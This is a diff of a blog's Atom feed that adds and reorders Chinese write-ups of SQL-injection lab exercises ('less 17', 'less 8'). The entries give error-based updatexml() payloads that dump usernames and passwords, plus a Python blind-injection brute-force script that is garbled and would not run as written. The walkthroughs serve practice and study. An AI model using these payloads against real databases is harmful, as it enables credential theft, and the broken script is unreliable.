@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2022-02-22T07:33:25.473Z</updated>
+  <updated>2022-02-23T10:02:45.285Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,26 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>less 17</title>
+    <link href="http://example.com/2022/02/23/17/"/>
+    <id>http://example.com/2022/02/23/17/</id>
+    <published>2022-02-23T08:53:32.000Z</published>
+    <updated>2022-02-23T10:02:45.285Z</updated>
+    
+    <content type="html"><![CDATA[<p>有题目可推断此题是在账户登入后更改密码界面为背景由上方标题可知账户名称<br><img src="https://s2.loli.net/2022/02/23/eGUtRxDig7cL2VC.png" alt="1"><br><img src="https://s2.loli.net/2022/02/23/TSgGxZFXaH9yQRc.png" alt="2"><br>由其源码可知对于密码没有处理，我们即对密码进行爆破<br>爆破的方式可使用updatexml()函数进行，通过测试可知此题数据有’所包裹。之后在密码行进行爆破。<br>    1’ and updatexml(1,concat(0x7e,database(),0x7e),1)– +<br><img src="https://s2.loli.net/2022/02/23/qcDh4IAZtw9a81g.png" alt="3"><br>    1’ and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1)– +<br><img src="https://s2.loli.net/2022/02/23/uErGCgBHSMD8UPs.png" alt="4"><br>    1’ and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name=’users’),1,31),0x7e),1)– +<br><img src="https://s2.loli.net/2022/02/23/7DibyR4HFvPsBZz.png" alt="5"><br>    1’ and updatexml(1,concat(0x7e,substr((select group_concat(id,username,password) from security.users),1,31),0x7e),1)– +<br>此时回显出现错误<br><img src="https://s2.loli.net/2022/02/23/aB1mIi7epT3WM6O.png" alt="6"><br>不能在FROM子句中为update指定目标表“users”<br>不能先select表中的某些值，再update这个表（在同一语句中）。<br>解决方法：将select出的结果作为派生表再select一遍，这样就规避了错误。<br>注意：此问题只出现于MySQL，msSQL和Oracle不会出现此问题。<br>正确代码如下：<br>    1’ and updatexml (1,concat(0x7e,substr((select*from(select group_concat(id,’<del>‘,username,’</del>‘,password)from security.users)a),1,31),0x7e),1)– +<br><img src="https://s2.loli.net/2022/02/23/1s6MrgAhQjoCHZf.png" alt="7"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;有题目可推断此题是在账户登入后更改密码界面为背景由上方标题可知账户名称&lt;br&gt;&lt;img src=&quot;https://s2.loli.net/2022/02/23/eGUtRxDig7cL2VC.png&quot; alt=&quot;1&quot;&gt;&lt;br&gt;&lt;img src=&quot;https://s2.lol</summary>
+      
+    
+    
+    
+    
+  </entry>
   
   <entry>
     <title>13</title>
@@ -191,26 +211,6 @@ f</summary>
   </entry>
   
   <entry>
-    <title>less 8</title>
-    <link href="http://example.com/1970/01/01/less8/"/>
-    <id>http://example.com/1970/01/01/less8/</id>
-    <published>1970-01-01T00:00:02.021Z</published>
-    <updated>2021-11-21T03:22:31.991Z</updated>
-    
-    <content type="html"><![CDATA[<p><img src="https://i.loli.net/2021/11/21/zWFwV6krjp5t1nI.png" alt="1.png"><br><img src="https://i.loli.net/2021/11/21/zZu94Frl1QnVhqk.png" alt="2.png"><br>输入?id=1显示正常，?id=1’输入后无显示，所以可以确定存在漏洞<br>由于为无回显信息，打开python进行爆破<br>    import requests<br>    dic=”abcdefghijklmnopqrstuvwxyz0123456789_”<br>    flag=””<br>    for i in range(1,10):<br>    for char in dic:<br>        url=”<a href="http://www/Less-8/?id=1&#39;&quot;">http://www/Less-8/?id=1&#39;&quot;</a>      //连接题目地址<br>        1.payload=”and substr(database（）,{},1)=’{}’–+”.format(i,char) //运用循环查库</p><pre><code>    2.Payload=”and substr((select table_name from information_schema.tables     Where table.schema=database() limit 0,1),&#123;&#125;,1)=’&#123;&#125;’--+.format(i,char) //进行查表    3.Payload=”and substr((select column_name from #information_schema.columns     Where table.name=’users’ limit 0,1),&#123;&#125;,1)=’&#123;&#125;’--+.format(i,char)//进行查列    4.payload=”and substr((password from security.users limit 0,1),&#123;&#125;,1)=’&#123;&#125;’--+.    Format(i,char)        //进行查询密码    url=url+payload           //    print(url)    r=requests.get(url)    if &quot;are&quot; in r.text:        flag+=char        //最后将所得出的flag打印出        print(flag)print(flag)</code></pre>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/11/21/zWFwV6krjp5t1nI.png&quot; alt=&quot;1.png&quot;&gt;&lt;br&gt;&lt;img src=&quot;https://i.loli.net/2021/11/21/zZu94Frl1QnVhqk.png&quot;</summary>
-      
-    
-    
-    
-    
-  </entry>
-  
-  <entry>
     <title>easy sql</title>
     <link href="http://example.com/1970/01/01/easy%20sql/"/>
     <id>http://example.com/1970/01/01/easy%20sql/</id>
@@ -223,6 +223,26 @@ f</summary>
       
       
     <summary type="html">&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/11/13/Z7TMRVi92p5raCc.png&quot; alt=&quot;1&quot;&gt;&lt;br&gt;由题目可知此题为联合查询输入-1因为数据中没有输入的值以空位代替，显示的为union select 后所输入的值&lt;br&gt;&lt;img</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>less 8</title>
+    <link href="http://example.com/1970/01/01/less8/"/>
+    <id>http://example.com/1970/01/01/less8/</id>
+    <published>1970-01-01T00:00:02.021Z</published>
+    <updated>2021-11-21T03:22:31.991Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://i.loli.net/2021/11/21/zWFwV6krjp5t1nI.png" alt="1.png"><br><img src="https://i.loli.net/2021/11/21/zZu94Frl1QnVhqk.png" alt="2.png"><br>输入?id=1显示正常，?id=1’输入后无显示，所以可以确定存在漏洞<br>由于为无回显信息，打开python进行爆破<br>    import requests<br>    dic=”abcdefghijklmnopqrstuvwxyz0123456789_”<br>    flag=””<br>    for i in range(1,10):<br>    for char in dic:<br>        url=”<a href="http://www/Less-8/?id=1&#39;&quot;">http://www/Less-8/?id=1&#39;&quot;</a>      //连接题目地址<br>        1.payload=”and substr(database（）,{},1)=’{}’–+”.format(i,char) //运用循环查库</p><pre><code>    2.Payload=”and substr((select table_name from information_schema.tables     Where table.schema=database() limit 0,1),&#123;&#125;,1)=’&#123;&#125;’--+.format(i,char) //进行查表    3.Payload=”and substr((select column_name from #information_schema.columns     Where table.name=’users’ limit 0,1),&#123;&#125;,1)=’&#123;&#125;’--+.format(i,char)//进行查列    4.payload=”and substr((password from security.users limit 0,1),&#123;&#125;,1)=’&#123;&#125;’--+.    Format(i,char)        //进行查询密码    url=url+payload           //    print(url)    r=requests.get(url)    if &quot;are&quot; in r.text:        flag+=char        //最后将所得出的flag打印出        print(flag)print(flag)</code></pre>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/11/21/zWFwV6krjp5t1nI.png&quot; alt=&quot;1.png&quot;&gt;&lt;br&gt;&lt;img src=&quot;https://i.loli.net/2021/11/21/zZu94Frl1QnVhqk.png&quot;</summary>
       
     
     
